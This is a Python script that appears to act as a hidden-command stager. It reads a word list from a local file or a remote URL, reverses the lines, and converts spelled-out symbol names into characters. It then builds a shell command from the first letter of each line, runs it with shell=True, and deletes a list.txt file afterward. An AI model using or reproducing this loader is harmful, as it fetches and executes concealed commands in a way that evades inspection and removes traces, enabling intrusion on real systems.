import argparse
import os
import requests
import subprocess


def read_from_file(file_path):
    with open(file_path, 'r') as file:
        lines = [line for line in file.read().splitlines() if line.strip()]
        lines.reverse()
    return lines


def read_from_url(url):
    response = requests.get(url)
    response.raise_for_status()
    lines = [line for line in response.text.splitlines() if line.strip()]
    lines.reverse()
    return lines


def combine_first_characters(words):
    return ''.join(word[0] for word in words).lower()


def replace_special_characters(text):
    replaced_text = text
    for char, replacement in special_characters.items():
        replaced_text = replaced_text.replace(char, replacement + " ")
    return replaced_text


def run_command(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if result.returncode == 0:
        print("Command executed successfully:")
        print(result.stdout)
    else:
        print("Error in command execution:")
        print(result.stderr)
    if os.path.exists('list.txt'):
        os.remove('list.txt')


special_characters = {
    "dot": ".",
    "comma": ",",
    "exclamation mark": "!",
    "question mark": "?",
    "colon": ":",
    "semicolon": ";",
    "apostrophe": "'",
    "quotation mark": '"',
    "left parenthesis": "(",
    "right parenthesis": ")",
    "left square bracket": "[",
    "right square bracket": "]",
    "left curly brace": "{",
    "right curly brace": "}",
    "less than": "<",
    "greater than": ">",
    "slash": "/",
    "backslash": "\\",
    "vertical bar": "|",
    "at sign": "@",
    "hash": "#",
    "dollar sign": "$",
    "percent sign": "%",
    "caret": "^",
    "ampersand": "&",
    "asterisk": "*",
    "hyphen": "-",
    "underscore": "_",
    "plus": "+",
    "equal": "=",
    "tilde": "~",
    "backtick": "`",
    "white": " "
}


def main():
    global words
    decoded_list = []
    parser = argparse.ArgumentParser(description='Read words from a file or URL.')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-file', type=str, help='Path to the local file')
    group.add_argument('-url', type=str, help='URL to read the list from')

    args = parser.parse_args()

    if args.file:
        words = read_from_file(args.file)
    elif args.url:
        words = read_from_url(args.url)

    for z in words:
        decoded_list.append(replace_special_characters(z))
    cmd = combine_first_characters(decoded_list)
    run_command(cmd)


if __name__ == '__main__':
    main()
